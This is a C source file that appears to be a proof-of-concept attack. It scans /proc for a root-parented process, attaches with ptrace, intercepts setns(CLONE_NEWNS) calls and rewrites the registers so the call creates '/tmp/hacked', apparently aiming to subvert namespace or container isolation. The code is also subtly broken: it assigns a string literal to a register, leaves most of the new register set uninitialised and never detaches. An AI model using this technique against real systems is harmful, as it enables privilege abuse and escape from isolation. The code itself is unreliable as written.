#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/syscall.h>

int main (int argc, char **argv) {
  DIR *dir;
  FILE *fp;
  struct dirent *dp;
  int pid = 999;
  int ppid = 999;
  int found = 0;

  for (found = 0; found == 0;) {
    dir = opendir("/proc");
    if (dir == NULL) {
      perror("opendir");
      return 1;
    }

    for (dp = readdir(dir); dp != NULL; dp = readdir(dir)) {
      int len = 11 + strlen(dp->d_name) + 1;
      char *stat_file = malloc(len);
      if (stat_file == NULL) {
        perror("malloc");
        return 1;
      }
      snprintf(stat_file, len, "/proc/%s/stat", dp->d_name);
      fp = fopen(stat_file, "r");

      if (fp != NULL) {
        fscanf(fp, "%d %*s %*c %d", &pid, &ppid);
        fclose(fp);
        if (pid != 1 && ppid == 0) {
          printf("Found: %s\n", stat_file);
          found = 1;
          break;
        }
      }
      free(stat_file);
    }
    closedir(dir);
  }

  int status;
  if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
    perror("ptrace");
    return 1;
  }
  if (waitpid(pid, &status, 0) < 0) {
    perror("waitpid");
    return 1;
  }

  if (WIFEXITED(status)) {
    printf("Exited with status: %d", status);
    return 1;
  } else if (WIFSIGNALED(status)) {
    printf("terminated by signal %d\n", WTERMSIG(status));
  } else if (WIFSTOPPED(status)) {
    printf("stopped by signal %d\n", WSTOPSIG(status));
  }

  while (1) {
    ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
    if (waitpid(pid, &status, 0) < 0) {
      perror("waitpid");
      return 1;
    }

    if (!(WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP)) {
      return 1;
    }

    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    if (regs.orig_rax == SYS_setns && regs.rsi == CLONE_NEWNS) {
      struct user_regs_struct new_regs;
      new_regs.orig_rax = SYS_open;
      new_regs.rdi = "/tmp/hacked";
      new_regs.rsi = O_CREAT;
      ptrace(PTRACE_SETREGS, pid, NULL, &new_regs);

      printf("orig_rax = %lld\n", regs.orig_rax);
      return 0;
    }
  }
 
  return 0;
}